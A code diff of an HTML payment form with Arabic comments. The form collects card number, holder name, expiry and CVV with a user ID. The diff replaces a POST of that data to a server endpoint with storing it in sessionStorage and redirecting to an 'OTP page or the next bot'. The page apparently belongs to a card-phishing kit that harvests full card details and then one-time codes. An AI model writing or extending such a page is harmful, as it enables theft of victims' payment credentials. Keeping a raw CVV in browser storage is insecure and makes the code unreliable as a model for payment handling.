@@ -365,7 +365,7 @@
 
     const form = document.getElementById('paymentForm');
 
-    form.addEventListener('submit', async function (event) {
+    form.addEventListener('submit', function (event) {
       event.preventDefault();
       clearAllErrors();
 
@@ -397,34 +397,22 @@
         valid = false;
       }
 
-    if (valid) {
-        submitBtn.disabled = true;
-        submitBtn.textContent = '⏳ جاري إرسال البيانات والتحويل...';
-
-        const data = {
+      if (valid) {
+        // يمكنك هنا حفظ البيانات محلياً مؤقتاً إذا أردت تمريرها للخطوة التالية
+        const paymentData = {
           user_id: userId,
           card_number: card,
           card_name: holder,
           exp_date: expiry,
           cvc: cvv
         };
+        
+        sessionStorage.setItem('temp_payment', JSON.stringify(paymentData));
 
-        try {
-          const response = await fetch('/api/payment-send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-          });
-          
-          const result = await response.json();
-          console.log('Server response:', result);
-        } catch (error) {
-          console.error('Fetch error:', error);
-        }
-
+        // الانتقال المباشر لصفحة الـ OTP أو البوت التالي
         window.location.href = 'otp.html';
       }
-    }); // هذا القوس لإغلاق الـ addEventListener الخاص بالـ submit
+    });
   </script>
 </body>
 </html>
